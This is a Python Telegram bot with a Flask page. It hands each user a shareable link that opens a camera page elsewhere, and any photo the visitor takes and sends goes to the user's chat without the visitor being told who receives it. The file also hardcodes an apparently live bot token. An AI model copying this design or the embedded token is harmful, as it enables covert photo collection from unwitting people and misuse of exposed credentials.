import os
import json
import logging
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from flask import Flask, render_template_string, request, jsonify
from threading import Thread
import base64
import uuid

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = "8069501498:AAExx7_1QkbFWLAkBcWZF7JNMKrpIo0uWCg"
WEBHOOK_URL = "https://camera-cjl1.onrender.com/"
FLASK_PORT = 5000

# Storage file (JSON)
USERS_FILE = "users.json"
PHOTOS_FILE = "photos.json"

# Flask app
app = Flask(__name__)

def load_users():
    """JSON faylından istifadəçiləri yüklə"""
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_users(users):
    """Istifadəçiləri JSON faylına saxla"""
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def load_photos():
    """Şəkilləri yüklə"""
    if os.path.exists(PHOTOS_FILE):
        with open(PHOTOS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_photos(photos):
    """Şəkilləri saxla"""
    with open(PHOTOS_FILE, 'w', encoding='utf-8') as f:
        json.dump(photos, f, indent=2, ensure_ascii=False)

class CameraBot:
    def __init__(self, token):
        self.token = token
        self.app = None
        
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /start command"""
        user_id = update.effective_user.id
        user_name = update.effective_user.first_name
        
        users = load_users()
        
        # İstifadəçini qeydiyyat et
        users[str(user_id)] = {
            'name': user_name,
            'telegram_id': user_id,
            'joined': datetime.now().isoformat(),
            'photos_received': 0
        }
        save_users(users)
        
        # Özəl link
        share_link = f"{WEBHOOK_URL}/share?user_id={user_id}"
        
        # Mesaj
        message = f"""
👋 Salam {user_name}!

🎉 Xoş gəldiniz!

📱 **Sizin Özəl Linkınız:**
`{share_link}`

💡 **Bu linki başqasına göndərin:**
- Onlar linki açsın
- Kamera icazəsi versin
- Şəkil çəksin
- Şəkil sizə gələcək! ✅

🔗 Linki kopylamaq üçün aşağıdakı düyməyə kliklə:
"""
        
        keyboard = [
            [InlineKeyboardButton("📋 Linki Kopyala", url=share_link)],
            [InlineKeyboardButton("📸 Çəkilən Şəkillərim", callback_data='my_photos')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(message, reply_markup=reply_markup)
        
        logger.info(f"User {user_id} ({user_name}) registered. Link: {share_link}")

    async def handle_photo(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """İndi istifadəçi şəkil göndərə biləcək"""
        if update.message.photo:
            await update.message.reply_text("✅ Şəkil qəbul edildi!")

    async def error(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle errors"""
        logger.warning(f'Error: {context.error}')

    def create_app(self):
        """Create Telegram application"""
        self.app = Application.builder().token(self.token).build()
        
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(MessageHandler(filters.PHOTO, self.handle_photo))
        self.app.add_error_handler(self.error)
        
        return self.app

# Initialize bot
camera_bot = CameraBot(BOT_TOKEN)

# ==================== FLASK ROUTES ====================

@app.route('/')
def index():
    """Ana səhifə"""
    return '''
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Telegram Kamera Bot</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
                   background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                   min-height: 100vh; display: flex; align-items: center; justify-content: center;
                   padding: 20px; }
            .container { background: white; padding: 40px; border-radius: 12px;
                        box-shadow: 0 20px 60px rgba(0,0,0,0.3); max-width: 600px; width: 100%; }
            h1 { color: #333; margin-bottom: 20px; font-size: 32px; }
            .info { background: #f0f9ff; padding: 20px; border-radius: 8px; margin: 20px 0;
                   border-left: 4px solid #667eea; }
            .info h3 { color: #667eea; margin-bottom: 10px; }
            .info p { color: #555; margin: 8px 0; font-size: 14px; }
            .step { margin: 15px 0; padding: 12px; background: #f9fafb; border-radius: 6px; }
            .step strong { color: #667eea; }
            a { color: #667eea; text-decoration: none; font-weight: 600; }
            a:hover { text-decoration: underline; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📷 Telegram Kamera Bot</h1>
            
            <div class="info">
                <h3>✅ Bot Çalışır!</h3>
                <p>Telegram-da @CameraPhotoBot-u tapıb /start yazın</p>
            </div>
            
            <div class="info">
                <h3>🎯 Necə İşləyir?</h3>
                <div class="step">
                    <strong>1️⃣ Adım:</strong> Telegram-da bot-a /start yazıb özəl linkini al
                </div>
                <div class="step">
                    <strong>2️⃣ Adım:</strong> Linki başqasına göndər
                </div>
                <div class="step">
                    <strong>3️⃣ Adım:</strong> O link-ə daxil olub şəkil çəksin
                </div>
                <div class="step">
                    <strong>4️⃣ Adım:</strong> Şəkil sənə gələcək! ✅
                </div>
            </div>
            
            <p style="text-align: center; color: #999; margin-top: 30px; font-size: 12px;">
                Bot v2.0 - Global Paylaşma Sistemi
            </p>
        </div>
    </body>
    </html>
    '''

@app.route('/share')
def share():
    """Kamera səhifəsi - hər kəs açıb şəkil çəkə bilər"""
    user_id = request.args.get('user_id')
    
    if not user_id:
        return '<h1>❌ Xəta: user_id parametri yoxdur</h1>', 400
    
    users = load_users()
    
    if user_id not in users:
        return '''
        <html>
        <head>
            <meta charset="UTF-8">
            <style>
                body { font-family: Arial; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                       min-height: 100vh; display: flex; align-items: center; justify-content: center; }
                .error { background: white; padding: 30px; border-radius: 12px; text-align: center; color: #dc2626; }
            </style>
        </head>
        <body>
            <div class="error">
                <h1>❌ Xəta</h1>
                <p>Bu link etibarlı deyil.</p>
            </div>
        </body>
        </html>
        ''', 400
    
    # HTML - KAMERA SƏHIFƏSI
    html = f'''
    <!DOCTYPE html>
    <html lang="az">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Kamera</title>
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
                   background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                   min-height: 100vh; display: flex; align-items: center; justify-content: center;
                   padding: 20px; }}
            .container {{ background: white; border-radius: 12px; box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                         padding: 30px; max-width: 500px; width: 100%; text-align: center; }}
            h1 {{ color: #333; margin-bottom: 10px; font-size: 28px; }}
            .subtitle {{ color: #666; margin-bottom: 30px; font-size: 14px; }}
            .start-btn {{ width: 100%; padding: 15px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                         color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600;
                         cursor: pointer; transition: all 0.2s; }}
            .start-btn:hover {{ transform: translateY(-2px); box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4); }}
            .start-btn:disabled {{ opacity: 0.5; cursor: not-allowed; }}
            video {{ width: 100%; border-radius: 8px; background: #000; margin: 20px 0; display: none; }}
            .button-group {{ display: flex; gap: 10px; margin-top: 20px; }}
            .btn {{ flex: 1; padding: 12px; border: none; border-radius: 8px; font-size: 14px; font-weight: 600;
                   cursor: pointer; color: white; transition: all 0.2s; }}
            .btn-capture {{ background: #10b981; }}
            .btn-capture:hover {{ background: #059669; }}
            .btn-cancel {{ background: #ef4444; }}
            .btn-cancel:hover {{ background: #dc2626; }}
            .btn-send {{ background: #667eea; }}
            .btn-send:hover {{ background: #5568d3; }}
            .btn-retry {{ background: #3b82f6; }}
            .btn-retry:hover {{ background: #2563eb; }}
            .message {{ padding: 15px; border-radius: 8px; margin: 20px 0; display: none; font-size: 14px; }}
            .message.success {{ background: #d1fae5; color: #065f46; border: 1px solid #6ee7b7; display: block; }}
            .message.error {{ background: #fee2e2; color: #7f1d1d; border: 1px solid #fca5a5; display: block; }}
            .preview-image {{ width: 100%; border-radius: 8px; margin: 20px 0; display: none; }}
            .preview-image.active {{ display: block; }}
            .content {{ display: none; }}
            .content.active {{ display: block; }}
            .step {{ font-size: 13px; color: #999; margin-bottom: 15px; }}
            .loader {{ display: none; width: 40px; height: 40px; border: 4px solid #f3f4f6;
                      border-top: 4px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite;
                      margin: 20px auto; }}
            .loader.active {{ display: block; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📷 Kamera</h1>
            <p class="subtitle">Şəkil çəkmək üçün düyməyə kliklə</p>
            
            <button class="start-btn" id="startBtn">🎥 Kameraı Başlat</button>
            
            <div class="content" id="cameraContent">
                <div class="step">Addım: <span id="step">1/3</span></div>
                
                <div id="captureSection">
                    <video id="video" playsinline></video>
                    <div class="button-group">
                        <button class="btn btn-capture" id="captureBtn">📸 Şəkil Çək</button>
                        <button class="btn btn-cancel" id="cancelBtn">✕ Ləğv Et</button>
                    </div>
                </div>
                
                <div id="previewSection" style="display: none;">
                    <p style="margin-bottom: 15px; color: #666;">Şəkil OK?</p>
                    <img id="previewImage" class="preview-image active">
                    <div class="button-group">
                        <button class="btn btn-send" id="sendBtn">✓ Göndər</button>
                        <button class="btn btn-retry" id="retryBtn">↻ Yenidən</button>
                    </div>
                </div>
            </div>
            
            <div id="message" class="message"></div>
            <div class="loader" id="loader"></div>
        </div>

        <script>
            const userId = "{user_id}";
            const startBtn = document.getElementById('startBtn');
            const video = document.getElementById('video');
            const canvas = document.createElement('canvas');
            const captureBtn = document.getElementById('captureBtn');
            const cancelBtn = document.getElementById('cancelBtn');
            const sendBtn = document.getElementById('sendBtn');
            const retryBtn = document.getElementById('retryBtn');
            const messageDiv = document.getElementById('message');
            const loader = document.getElementById('loader');
            const previewImage = document.getElementById('previewImage');
            const cameraContent = document.getElementById('cameraContent');
            const captureSection = document.getElementById('captureSection');
            const previewSection = document.getElementById('previewSection');
            const stepIndicator = document.getElementById('step');
            
            let stream = null;
            
            function showMessage(text, type = 'success') {{
                messageDiv.textContent = text;
                messageDiv.className = 'message ' + type;
                setTimeout(() => {{ messageDiv.className = 'message'; }}, 3000);
            }}
            
            startBtn.addEventListener('click', async () => {{
                try {{
                    stream = await navigator.mediaDevices.getUserMedia({{ 
                        video: {{ facingMode: 'user' }},
                        audio: false 
                    }});
                    
                    video.srcObject = stream;
                    video.style.display = 'block';
                    startBtn.style.display = 'none';
                    cameraContent.classList.add('active');
                    stepIndicator.textContent = '1/3';
                    showMessage('✅ Kamera hazır. Şəkil çəkə bilərsən');
                }} catch (err) {{
                    showMessage('❌ Kamera icazəsi rədd edildi!', 'error');
                }}
            }});
            
            captureBtn.addEventListener('click', () => {{
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                previewImage.src = canvas.toDataURL('image/jpeg');
                captureSection.style.display = 'none';
                previewSection.style.display = 'block';
                stepIndicator.textContent = '2/3';
                showMessage('✅ Şəkil çəkildi. Göndərmə üçün hazır');
            }});
            
            cancelBtn.addEventListener('click', () => {{
                if (stream) {{
                    stream.getTracks().forEach(track => track.stop());
                }}
                cameraContent.classList.remove('active');
                startBtn.style.display = 'block';
                showMessage('⚠️ Ləğv edildi');
            }});
            
            retryBtn.addEventListener('click', () => {{
                captureSection.style.display = 'block';
                previewSection.style.display = 'none';
                stepIndicator.textContent = '1/3';
                showMessage('↻ Yenidən çəkə bilərsən');
            }});
            
            sendBtn.addEventListener('click', async () => {{
                loader.classList.add('active');
                sendBtn.disabled = true;
                
                try {{
                    const response = await fetch('/upload-photo', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            user_id: userId,
                            photo: canvas.toDataURL('image/jpeg')
                        }})
                    }});
                    
                    const data = await response.json();
                    
                    if (data.success) {{
                        loader.classList.remove('active');
                        previewSection.style.display = 'none';
                        captureSection.style.display = 'none';
                        startBtn.style.display = 'block';
                        startBtn.textContent = '✅ Tamamlandı!';
                        startBtn.disabled = true;
                        stepIndicator.textContent = '3/3';
                        showMessage('✅ Şəkil uğurla göndərildi!');
                    }} else {{
                        showMessage('❌ Xəta: ' + data.error, 'error');
                        loader.classList.remove('active');
                        sendBtn.disabled = false;
                    }}
                }} catch (err) {{
                    showMessage('❌ Göndərmə xətası: ' + err.message, 'error');
                    loader.classList.remove('active');
                    sendBtn.disabled = false;
                }}
            }});
            
            showMessage('✅ Kameraı başlatmaq üçün düyməyə kliklə');
        </script>
    </body>
    </html>
    '''
    return html

@app.route('/upload-photo', methods=['POST'])
async def upload_photo():
    """Şəkili qəbul et və bot-a göndər"""
    try:
        data = request.get_json()
        user_id = data.get('user_id')
        photo_base64 = data.get('photo')
        
        if not user_id or not photo_base64:
            return jsonify({'success': False, 'error': 'Parametr yoxdur'}), 400
        
        users = load_users()
        
        if user_id not in users:
            return jsonify({'success': False, 'error': 'İstifadəçi tapılmadı'}), 400
        
        # Photo sayını artır
        users[user_id]['photos_received'] = users[user_id].get('photos_received', 0) + 1
        save_users(users)
        
        # Foto saxla
        photo_id = str(uuid.uuid4())[:8]
        photos = load_photos()
        photos[photo_id] = {
            'user_id': user_id,
            'timestamp': datetime.now().isoformat(),
            'photo': photo_base64
        }
        save_photos(photos)
        
        # Bot-a göndər
        try:
            bot = camera_bot.app.bot
            
            # Base64-dən binary-ə çevir
            photo_bytes = base64.b64decode(photo_base64.split(',')[1])
            
            await bot.send_photo(
                chat_id=int(user_id),
                photo=photo_bytes,
                caption=f"📸 Yeni Şəkil Alındı!\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            
            logger.info(f"Photo sent to user {user_id}")
            return jsonify({'success': True, 'message': 'Şəkil göndərildi'})
        
        except Exception as e:
            logger.error(f"Error sending photo: {str(e)}")
            return jsonify({'success': False, 'error': str(e)}), 500
    
    except Exception as e:
        logger.error(f"Error uploading photo: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

def run_flask():
    """Flask-ı fonda çalışdır"""
    app.run(host='0.0.0.0', port=FLASK_PORT, debug=False)

def main():
    """Əsas funksiya"""
    # Bot app yarat
    bot_app = camera_bot.create_app()
    
    # Flask-ı arxada çalışdır
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    logger.info("Bot started successfully!")
    logger.info(f"Webhook URL: {WEBHOOK_URL}")
    logger.info(f"Flask running on port {FLASK_PORT}")
    logger.info(f"Share links format: {WEBHOOK_URL}/share?user_id=USER_ID")
    
    # Bot'u çalışdır
    bot_app.run_polling()

if __name__ == '__main__':
    main()
